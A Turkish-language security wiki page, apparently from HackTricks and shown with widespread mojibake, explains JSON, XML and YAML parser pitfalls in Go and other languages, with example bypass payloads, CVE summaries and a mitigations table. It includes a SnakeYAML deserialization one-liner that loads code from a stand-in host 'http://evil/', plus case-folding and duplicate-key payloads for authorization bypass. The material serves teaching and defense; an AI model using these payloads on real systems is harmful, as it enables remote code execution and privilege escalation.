# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

AÅŸaÄŸÄ±daki sorunlar Go JSON'da tespit edilmiÅŸtir, ancak diÄŸer dillerde de mevcut olabilir. Bu sorunlar [**bu blog yazÄ±sÄ±nda**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/) yayÄ±nlanmÄ±ÅŸtÄ±r.

Goâ€™nun JSON, XML ve YAML ayrÄ±ÅŸtÄ±rÄ±cÄ±larÄ±, **kimlik doÄŸrulamasÄ±nÄ± atlatmak**, **yetkileri yÃ¼kseltmek** veya **hassas verileri dÄ±ÅŸa aktarmak** iÃ§in kÃ¶tÃ¼ye kullanÄ±labilecek uzun bir tutarsÄ±zlÄ±k ve gÃ¼vensiz varsayÄ±lan ayarlar geÃ§miÅŸine sahiptir.

### (Un)Marshaling Beklenmeyen Veriler

AmaÃ§, bir saldÄ±rganÄ±n hassas alanlarÄ± okumak/yazmak iÃ§in izin verilen yapÄ±larÄ± istismar etmektir (Ã¶rneÄŸin, `IsAdmin`, `Password`).

- Ã–rnek YapÄ±:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- YaygÄ±n GÃ¼venlik AÃ§Ä±klarÄ±

1. **Eksik etiket** (etiket yok = alan varsayÄ±lan olarak hala ayrÄ±ÅŸtÄ±rÄ±lÄ±r):
```go
type User struct {
Username string
}
```
YÃ¼k:
```json
{"Username": "admin"}
```
2. **YanlÄ±ÅŸ `-` kullanÄ±mÄ±**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // âŒ wrong
}
```
YÃ¼k:
```json
{"-": true}
```
âœ”ï¸ AlanÄ±n (un)marshalled olmasÄ±nÄ± engellemenin doÄŸru yolu:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Parser FarklÄ±lÄ±klarÄ±

AmaÃ§, farklÄ± parser'larÄ±n aynÄ± yÃ¼kÃ¼ nasÄ±l farklÄ± yorumladÄ±ÄŸÄ±nÄ± kullanarak yetkilendirmeyi atlatmaktÄ±r, Ã¶rneÄŸin:
- CVE-2017-12635: Tekrar eden anahtarlar aracÄ±lÄ±ÄŸÄ±yla Apache CouchDB atlatmasÄ±
- 2022: XML parser tutarsÄ±zlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla Zoom 0-tÄ±klama RCE
- GitLab 2025 SAML atlatmasÄ± aracÄ±lÄ±ÄŸÄ±yla XML tuhaflÄ±klarÄ±

**1. Tekrar Eden Alanlar:**
Go'nun `encoding/json` **son** alanÄ± alÄ±r.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
DiÄŸer ayrÄ±ÅŸtÄ±rÄ±cÄ±lar (Ã¶rneÄŸin, Java'nÄ±n Jackson'Ä±) **ilk** olanÄ± alabilir.

**2. BÃ¼yÃ¼k/KÃ¼Ã§Ã¼k Harf DuyarsÄ±zlÄ±ÄŸÄ±:**
Go bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarsÄ±zdÄ±r:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
Unicode hileleri bile iÅŸe yarar:
```go
json.Unmarshal([]byte(`{"aâ„ªtionÅ¿": "bypass"}`), &req)
```
**3. Hizmetler arasÄ± uyumsuzluk:**
Hayal edin:
- Go ile yazÄ±lmÄ±ÅŸ bir Proxy
- Python ile yazÄ±lmÄ±ÅŸ bir AuthZ servisi

SaldÄ±rgan gÃ¶nderir:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python `UserAction`'Ä± gÃ¶rÃ¼r, izin verir
- Go `AdminAction`'Ä± gÃ¶rÃ¼r, yÃ¼rÃ¼tÃ¼r


### Veri FormatÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± (Polyglots)

AmaÃ§, formatlarÄ± (JSON/XML/YAML) karÄ±ÅŸtÄ±ran veya ayrÄ±ÅŸtÄ±rÄ±cÄ± hatalarÄ±nda aÃ§Ä±k kalan sistemleri istismar etmektir:
- **CVE-2020-16250**: HashiCorp Vault, STS'nin XML yerine JSON dÃ¶ndÃ¼rmesinin ardÄ±ndan JSON'u bir XML ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ± ile ayrÄ±ÅŸtÄ±rdÄ±.

SaldÄ±rganÄ±n kontrol ettiÄŸi:
- `Accept: application/json` baÅŸlÄ±ÄŸÄ±
- JSON gÃ¶vdesinin kÄ±smi kontrolÃ¼

Go'nun XML ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ± **yine de** bunu ayrÄ±ÅŸtÄ±rdÄ± ve enjekte edilen kimliÄŸe gÃ¼vendi.

- Ã–zel yÃ¼k:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
SonuÃ§:
- **Go JSON** ayrÄ±ÅŸtÄ±rÄ±cÄ±: `Action_2` (bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarsÄ±z + son kazanan)
- **YAML** ayrÄ±ÅŸtÄ±rÄ±cÄ±: `Action_1` (bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarlÄ±)
- **XML** ayrÄ±ÅŸtÄ±rÄ±cÄ±: dize iÃ§indeki `"Action_3"`'Ã¼ ayrÄ±ÅŸtÄ±rÄ±r

---

## Dikkate DeÄŸer AyrÄ±ÅŸtÄ±rÄ±cÄ± GÃ¼venlik AÃ§Ä±klarÄ± (2023-2025)

> AÅŸaÄŸÄ±daki kamuya aÃ§Ä±k olarak istismar edilebilen sorunlar, gÃ¼vensiz ayrÄ±ÅŸtÄ±rmanÄ±n Ã§ok dilli bir problem olduÄŸunu gÃ¶stermektedir â€” sadece bir Go problemi deÄŸildir.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* Etkileyen: `org.yaml:snakeyaml` < **2.0** (Spring-Boot, Jenkins vb. tarafÄ±ndan kullanÄ±lÄ±r).
* Temel neden: `new Constructor()` **rastgele Java sÄ±nÄ±flarÄ±nÄ±** ayrÄ±ÅŸtÄ±rÄ±r, uzaktan kod yÃ¼rÃ¼tme ile sonuÃ§lanan gadget zincirlerine izin verir.
* Tek satÄ±rlÄ±k PoC (savunmasÄ±z hostta hesap makinesini aÃ§ar):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* DÃ¼zeltme / Ã–nleme:
1. **â‰¥2.0'a YÃ¼kseltin** (varsayÄ±lan olarak `SafeLoader` kullanÄ±r).
2. Eski sÃ¼rÃ¼mlerde, aÃ§Ä±kÃ§a `new Yaml(new SafeConstructor())` kullanÄ±n.

### libyaml Ã‡ift Serbest BÄ±rakma (CVE-2024-35325)

* Etkiler: `libyaml` â‰¤0.2.5 (birÃ§ok dil baÄŸlamasÄ± tarafÄ±ndan kullanÄ±lan C kÃ¼tÃ¼phanesi).
* Sorun: `yaml_event_delete()` fonksiyonunun iki kez Ã§aÄŸrÄ±lmasÄ±, saldÄ±rganlarÄ±n DoS veya bazÄ± senaryolarda heap istismarÄ± yapabileceÄŸi bir Ã§ift serbest bÄ±rakmaya yol aÃ§ar.
* Durum: Ãœst akÄ±ÅŸ â€œAPI kÃ¶tÃ¼ye kullanÄ±mÄ±â€ olarak reddetti, ancak Linux daÄŸÄ±tÄ±mlarÄ±, iÅŸaretÃ§iyi savunmacÄ± bir ÅŸekilde null-serbest bÄ±rakan yamanmÄ±ÅŸ **0.2.6** sÃ¼rÃ¼mÃ¼nÃ¼ gÃ¶nderdi.

### RapidJSON Tam SayÄ± (Alt|Ãœst)-taÅŸma (CVE-2024-38517 / CVE-2024-39684)

* Etkiler: Tencent **RapidJSON** `8269bc2` commit'inden Ã¶nce (<1.1.0-patch-22).
* Hata: `GenericReader::ParseNumber()` iÃ§inde kontrolsÃ¼z aritmetik, saldÄ±rganlarÄ±n bÃ¼yÃ¼k sayÄ±sal literaller oluÅŸturmasÄ±na izin verir; bu literaller sarÄ±lÄ±r ve heap'i bozar â€” sonuÃ§ta, elde edilen nesne grafiÄŸi yetkilendirme kararlarÄ± iÃ§in kullanÄ±ldÄ±ÄŸÄ±nda ayrÄ±calÄ±k yÃ¼kseltmesine olanak tanÄ±r.

---

### ğŸ” Ã–nlemler (GÃ¼ncellenmiÅŸ)

| Risk                                | DÃ¼zeltme / Ã–neri                                      |
|-------------------------------------|------------------------------------------------------------|
| Bilinmeyen alanlar (JSON)           | `decoder.DisallowUnknownFields()`                          |
| Tekrar eden alanlar (JSON)          | âŒ stdlib'de dÃ¼zeltme yok â€” [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) ile doÄŸrulayÄ±n |
| BÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarsÄ±z eÅŸleÅŸme (Go) | âŒ DÃ¼zeltme yok â€” yapÄ± etiketlerini doÄŸrulayÄ±n + girdi Ã¶n-canonize edin   |
| XML Ã§Ã¶p verisi / XXE                | SertleÅŸtirilmiÅŸ bir ayrÄ±ÅŸtÄ±rÄ±cÄ± kullanÄ±n (`encoding/xml` + `DisallowDTD`)     |
| YAML bilinmeyen anahtarlar           | `yaml.KnownFields(true)`                                   |
| **GÃ¼vensiz YAML serileÅŸtirmesi**    | SafeConstructor kullanÄ±n / SnakeYAML â‰¥2.0'a yÃ¼kseltin            |
| libyaml â‰¤0.2.5 Ã§ift serbest bÄ±rakma   | **0.2.6** veya daÄŸÄ±tÄ±m yamanmÄ±ÅŸ sÃ¼rÃ¼me yÃ¼kseltin            |
| RapidJSON <yamanmÄ±ÅŸ commit           | En son RapidJSON ile derleyin (â‰¥Temmuz 2024)              |

## Referanslar

- Baeldung â€“ â€œSnakeYAML 2.0 ile CVE-2022-1471'i Ã‡Ã¶zmeâ€
- Ubuntu GÃ¼venlik Ä°zleyici â€“ CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
